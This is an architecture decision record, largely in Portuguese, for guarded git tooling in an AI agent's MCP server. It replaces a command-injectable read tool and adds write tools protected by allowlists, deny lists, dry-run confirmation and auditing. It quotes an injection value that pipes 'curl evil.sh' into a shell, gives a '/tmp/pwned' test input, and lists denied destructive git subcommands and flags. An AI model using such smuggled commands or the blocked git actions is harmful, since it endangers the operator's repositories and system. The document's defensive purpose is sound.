---
id: "ADR-0062"
title: "Git Operations — Guarded Local Writes, Fleet Status, and Release Readiness"
status: proposed
date: "2026-08-04"
classification: major
project: "GLOBAL"
---

## Relations

- **Extends:** ADR-0006 (Git Sherlock). Não supersede — a ADR-0006 continua
  `proposed` e a tool `git_sherlock` sobrevive intacta com mais ações.
- **Constrained-by:** ADR-0059 (Tool Curation) — o catálogo é orçamento escasso;
  esta ADR gasta +3 tools, não ~10.
- **Constrained-by:** ADR-0061 (Project Profiles) — o repo default de qualquer
  tool de git resolve-se pelo profile ativo antes de cair em `PROJECT_ROOT`/cwd.

## Context

O ecossistema tem 21 repos git planos em `~/master/`. O único tooling de git no
MCP é a `git_sherlock` (ADR-0006): 6 ações read-only. Auditoria do código revelou
quatro defeitos que a tornam inadequada — e, num produto de segurança,
constrangedora:

1. **Nunca define `cwd`.** Todos os `execa("git", ...)` em `src/tools/git-sherlock.ts`
   herdam o cwd do processo do servidor. Análise multi-repo é impossível; o
   resultado descreve sempre um repo que o chamador não escolheu.

2. **Injeção de comando.** `what_changed` e `churn` passam `shell: true` com
   `--since="${since}"` interpolado a partir de input do utilizador. Um valor
   como `"; curl evil.sh | sh #` executa no shell.

3. **Erros engolidos.** Todo comando termina em `.catch(() => ({ stdout: "" }))`.
   Um repo inexistente, um git em falta e um repo genuinamente limpo produzem
   exatamente o mesmo JSON. O agente não consegue distinguir "nada mudou" de
   "não consegui ver".

4. **Zero escrita, zero visão de frota.** O operador é solo, com 21 repos, e não
   tem forma de perguntar "o que está dirty, unpushed ou atrás do upstream em
   tudo". Cada commit passa por Bash cru, sem política nem auditoria.

Dois defeitos adjacentes bloqueiam o trabalho e são corrigidos aqui:

5. **Quatro tools mortas.** `change_impact`, `ci_failure_summary`,
   `ci_batch_triage` e `cache_tuning_advisor` estão no catálogo, implementadas e
   testadas — mas sem entrada em `buildDispatchMap`. `src/index.ts` lança
   `MethodNotFound`. São anunciadas em `tools/list` e falham sempre.

6. **Workspace root errado.** `MASTER_ROOT`/`ECOSYSTEM_ROOT` apontam para
   `~/Projects/master/deploy`, que contém apenas `certs/ nginx/ .env`. Os repos
   reais estão em `~/master/`. `ecosystem_map`, `cross_project_search`,
   `dependency_graph_analyzer` e as ADR tools encontram zero, em silêncio.

## Decision

### 1. Camada partilhada de execução — `src/tools/git/exec.ts`

Um `RunCommand` injetável (estruturalmente compatível com o padrão já provado em
`professional-tools.ts`), `resolveRepo()` e `runGit()`. Regras invioláveis:

- **Argv apenas.** Nunca `shell: true`, nunca comandos em string.
- Env endurecido: `GIT_TERMINAL_PROMPT=0` (nunca pendura em prompt de
  credencial), `GIT_OPTIONAL_LOCKS=0` (`status` fica read-only de facto),
  `GIT_PAGER=cat`, `LC_ALL=C`.
- `runGit` **nunca lança** em exit ≠ 0 — devolve `{ ok, exit_code, stderr_tail }`.
  Falha é dado, não ausência de dado.
- Resolução de repo canonicalizada por `rev-parse --show-toplevel` e
  **re-validada** contra os boundaries — apanha symlinks e worktrees cujo gitdir
  vive fora do ecossistema.
- Toda mutação emite uma entrada de auditoria pelo logger pino existente.

### 2. Write guard — `src/tools/git/guard.ts`

Função pura, síncrona, allowlist-first e **posicional**. `argv[0]` tem de casar
`/^[a-z][a-z0-9-]*$/`, o que sozinho elimina toda a classe de global options
(`-c core.sshCommand=`, `-C /etc`, `--git-dir=`, `--exec-path=`). Uma máquina de
estados distingue flag de valor, pelo que `commit -m "--force fix"` é aceite e
`commit --force -m x` é negado — os dois lados que um `argv.includes("--force")`
ingénuo erra.

### 3. Três tools umbrella novas

- `git_fleet` — survey read-only dos 21 repos.
- `git_workbench` — escritas locais guardadas, `dry_run` por default.
- `git_release` — readiness, changelog e estado de PR (read-only).

### 4. Cinco ações read novas na `git_sherlock`

`branch_inventory`, `divergence`, `release_readiness`, `commit_lint`,
`regression_range`.

## Security

Esta é a secção normativa. O guard é a única fronteira entre um agente e o repo
do operador.

### Subcomandos hard-denied

Nunca montados por nenhuma tool, nunca aceites vindos do chamador:

```
push  pull  reset  clean  rebase  merge  cherry-pick  revert  am  apply
restore  checkout  rm  mv  gc  prune  reflog  update-ref  filter-branch
filter-repo  remote  submodule  notes  replace  bundle  daemon  credential
sparse-checkout  init  clone  archive  send-email  request-pull  hook
```

### Flags globalmente negadas

Rejeitadas em qualquer subcomando, em forma curta, longa ou `--flag=valor`:

```
-f  --force  --force-with-lease  --force-if-includes  -D  --hard  --soft
--mixed  --keep  --amend  --no-verify  -i  --interactive  --autosquash
--onto  --root  -e  --edit  --exec  --upload-pack  --receive-pack
--upload-archive  --index-filter  --tree-filter  --msg-filter  --env-filter
--commit-filter  --subdirectory-filter  --mirror  --bare  --separate-git-dir
--template  -c  -C  --git-dir  --work-tree  --exec-path  --namespace
--config-env
```

`--amend` é negado deliberadamente: reescreve um commit, e rewrite de história
está fora do escopo autorizado. É uma escolha reconsiderável — uma versão futura
poderia permiti-lo condicionado a "HEAD não é antecessor do upstream".

### Write allowlist

As únicas mutações que o sistema consegue montar:

| Subcomando | Flags permitidas | Recebem valor | Positionals |
|---|---|---|---|
| `add` | `-A` `--all` `-u` `--update` `-N` `--intent-to-add` `--` | — | paths (`validatePath`) |
| `commit` | `-m` `--message` `-a` `--all` `-s` `--signoff` | `-m` `--message` | nenhum |
| `branch` | `--list` `--show-current` `-v` `-vv` `-d` `--delete` `--merged` `--format` | `--format` `--merged` | nome |
| `switch` | `-c` `--create` `--no-guess` | `-c` `--create` | nome |
| `tag` | `-a` `-m` `-s` `--sign` `-l` `--list` `-n` `--sort` | `-m` `--sort` | tag, commit-ish |
| `stash` | `push` `list` `show` `pop` `apply` `-m` `--message` `-u` `--include-untracked` `--keep-index` | `-m` `--message` | — |
| `worktree` | `add` `list` `remove` `--porcelain` `-b` | `-b` | path (vs ecosystem root), branch |

`stash drop`, `stash clear` e `stash branch` estão fora: destroem trabalho.
`branch -D` está fora: só `-d`, que o git recusa em branch não-merged.

### `fetch` — caso especial

Não está no write allowlist nem hard-denied. É alcançável apenas por
`git_fleet { refresh: true }`, na forma fixa `["fetch", "--quiet", "--no-tags"]`,
auditado como mutação (escreve remote-tracking refs). Com `refresh: false`
(default) o ahead/behind vem de refs em cache e a resposta carrega
`upstream_ref_age_seconds` — um número stale visível é preferível a um número
errado invisível.

### `gh` allowlist

Permitido: `pr view|list|checks|diff|status`, `run view|list`, `repo view`.
Negado: `pr create|merge|close|edit|ready|review|comment`,
`release create|edit|delete`, `workflow run`, `api`, `auth`, `secret`,
`ssh-key`, `gist`. **O agente não publica código externamente.**

### Protocolo dry_run / confirm

| `dry_run` | `confirm` | Comportamento |
|---|---|---|
| `true` (default) | qualquer | Preflight read-only. `status: "planned"`, argv exato por passo. Zero mutações. |
| `false` | ausente/`false` | `status: "confirmation_required"`. Zero mutações. |
| `false` | `true` | Guard → executa → `"executed"` ou `"failed"`. |

`reason` (mín. 3 caracteres) é obrigatório em toda ação mutante e vai para o
registo de auditoria. Uma negação **nunca lança**: devolve
`{ status: "denied", denials: [...], allowed_alternatives: [...] }` com
`isError: true` — o agente recebe um motivo legível por máquina e uma
alternativa legal, não um stack trace.

### Kill switch

`GIT_OPS_WRITES_ENABLED=false` faz toda mutação devolver `writes_disabled` no
guard. Ao nível de governança, `TOOL_DISABLED_LIST=git_workbench` remove a tool
do catálogo.

## Rationale

**Porquê 3 tools umbrella e não ~10.** A ADR-0059 existe porque o catálogo
degrada o discovery do modelo: 25 tools foram podadas por esse motivo. Uma tool
por operação (`git_branch`, `git_commit`, `git_stash`, ...) reintroduziria o
problema que a 0059 resolveu. O agrupamento é por verbo, não por subcomando:
`git_fleet` responde "qual é o estado da frota", `git_workbench` responde "muda
isto aqui", `git_release` responde "posso lançar".

**Porquê `dry_run: true` por default.** Um default seguro é a única política que
sobrevive a um chamador que não leu o schema. O custo é uma chamada extra no
caminho feliz; o benefício é que nenhum engano de argumentos muta um repo.

**Porquê não `simple-git`.** Adicionar uma dependência npm força regenerar
`npmDepsHash` no `flake.nix` e alarga a superfície de supply-chain de um
componente que executa comandos no repo do operador. `execa` já está presente e
a camada que precisamos é fina.

**Porquê os três mecanismos de exec existentes ficam intocados.** O repo tem
`execa` direto, `execa` atrás de DI, e `promisify(exec)`. Unificá-los seria uma
refatoração não pedida que toca código a funcionar. Código novo usa o helper
novo; o existente fica.

**Porquê um teste de paridade catálogo↔dispatch.** As quatro tools mortas não
foram um erro de digitação isolado — foram a consequência previsível de duas
listas mantidas à mão em ficheiros diferentes. As 4 linhas corrigem a instância;
o teste corrige a classe.

## Trade-offs

- `git_fleet` sobre 21 repos custa ~7 comandos git por repo. Mitigado com
  paralelismo limitado (default 4) e timeout por repo.
- Ahead/behind sem `refresh` reflete refs potencialmente antigas. Mitigado
  expondo `upstream_ref_age_seconds` em vez de esconder o problema.
- O guard é uma allowlist: uma flag nova e legítima do git é negada até ser
  adicionada. Escolha deliberada — falhar fechado.

## Consequences

### Positivas

- Análise de git passa a ser multi-repo e o repo alvo passa a ser explícito.
- A superfície de injeção desaparece: sem shell, argv apenas.
- Mutações passam a ter política, confirmação e trilho de auditoria — hoje não
  têm nada.
- Quatro tools testadas voltam a estar acessíveis; `ecosystem_map` e as ADR
  tools voltam a encontrar os 21 repos.

### Negativas

- Comportamento mudado: o repo default da `git_sherlock` passa a ser o profile
  ativo / `PROJECT_ROOT` / cwd, em vez do cwd do processo do servidor. É a
  correção, mas altera resultados para quem dependia do acidente antigo.
- +3 tools no catálogo, contra a pressão da ADR-0059.

### Riscos

| Risco | Prob. | Impacto | Mitigação |
|---|---|---|---|
| Bypass do guard por flag não prevista | baixa | alto | Allowlist (falha fechada) + `argv[0]` obrigatoriamente subcomando + testes tabelados de negação |
| Ahead/behind stale sem fetch | média | baixo | `upstream_ref_age_seconds` exposto; `refresh` explícito disponível |
| Escape de path em `worktree add` | baixa | alto | `validatePath` contra o ecosystem root, testado |
| Cache semântico repõe mutação | média | alto | As 4 tools de git entram em `VOLATILE_TOOLS` |
| Repo default errado após B3 | média | baixo | `source` da resolução vem na resposta de toda tool |

## Implementation

- [ ] S1 — wiring das 4 tools mortas + `tests/server/dispatch-parity.test.ts`
- [ ] S2 — `src/config/workspace.ts` + religar 5 sítios com root hardcoded
- [ ] S3 — `src/tools/git/exec.ts` + `src/tools/git/guard.ts` + testes
- [ ] S4 — `git_sherlock`: argv-only, `repo`/cwd, erros visíveis, `VOLATILE_TOOLS`
- [ ] S5 — 5 ações read novas
- [ ] S6 — `git_fleet` + wiring
- [ ] S7 — `git_workbench` + wiring
- [ ] S8 — `git_release` + wiring
- [ ] S9 — manifest, docs, aceitação

Sem dependências npm novas — `npmDepsHash` do `flake.nix` não muda.

## Verification

- `npm run build && node --test build/tests/**/*.test.js` verde.
- `grep -c "ADR-0059 curation" build/src/server/tool-registry.js` = 1 (a
  curação sobreviveu à edição do catálogo).
- `git_sherlock { action: "what_changed", since: '"; touch /tmp/pwned #' }` não
  cria `/tmp/pwned`.
- `git_workbench { action: "commit", ... }` sem `confirm` não produz commit;
  `git log -1` inalterado.
- `~/.local/state/securellm-mcp/mcp.log` contém uma entrada `git_ops.*` por
  mutação planeada, executada e negada.
